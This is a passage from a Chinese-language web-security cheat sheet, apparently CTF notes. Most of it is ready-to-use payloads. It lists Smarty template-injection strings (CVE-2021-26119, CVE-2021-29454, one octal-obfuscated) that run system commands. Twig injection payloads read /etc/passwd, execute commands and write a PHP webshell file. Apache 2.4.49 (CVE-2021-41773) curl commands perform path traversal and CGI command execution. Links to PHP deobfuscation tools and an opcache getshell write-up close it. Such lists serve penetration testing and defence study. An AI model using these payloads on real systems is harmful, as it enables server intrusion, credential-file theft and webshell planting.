string:{$smarty.template_object->smarty->disableSecurity()->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->addTemplateDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setTemplateDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->addPluginsDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setPluginsDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setCompileDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setCacheDir('./x')->display('string:{system(whoami)}')} （CVE-2021-26119，Smarty=3.1.44/4.1.0）

eval:{math equation='("\163\171\163\164\145\155")("\167\150\157\141\155\151")'} （CVE-2021-29454，PHP7，Smarty<3.1.42/<4.0.2）
```

#### twig

复制

```
{{'/etc/passwd'|file_excerpt(1,30)}}
{{app.request.files.get(1).__construct('/etc/passwd','')}}
{{app.request.files.get(1).openFile.fread(99)}}
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
{{["id"]|map("system")|join(",")}}
{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
{{["id",0]|sort("system")|join(",")}}
{{["id"]|filter("system")|join(",")}}
{{[0,0]|reduce("system","id")|join(",")}}
{{['cat /etc/passwd']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

POST /subscribe?0=cat+/etc/passwd HTTP/1.1
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
```

参考：[TWIG 全版本通用 SSTI payloads](https://xz.aliyun.com/t/7518#toc-5)



### 反混淆

https://www.zhaoyuanma.com/phpjm.html

https://yoursunny.com/p/PHP-decode/



### 中间件漏洞

#### Apache

- Apache 2.4.49

  CVE-2021-41773

  目录穿越漏洞。可以读取到Apache服务器Web目录以外的其他文件，或者读取Web中的脚本源码，或者在开启cgi或cgid的服务器上执行任意命令。

  `curl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd`

  `curl -v --data "echo;命令" 'http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'`



### 其他

#### opcache

opencache是一种php7自带的缓存引擎，它将编译过一遍的的php脚本以字节码文件的形式缓存在特定目录中（在php.ini中指定）。这样节省了每次访问同一脚本都要加载和解析的时间开销。（先检查有没有bin文件有就直接用）

[opcache缓存getshell](http://redteam.today/2018/04/08/opcache缓存getshell/)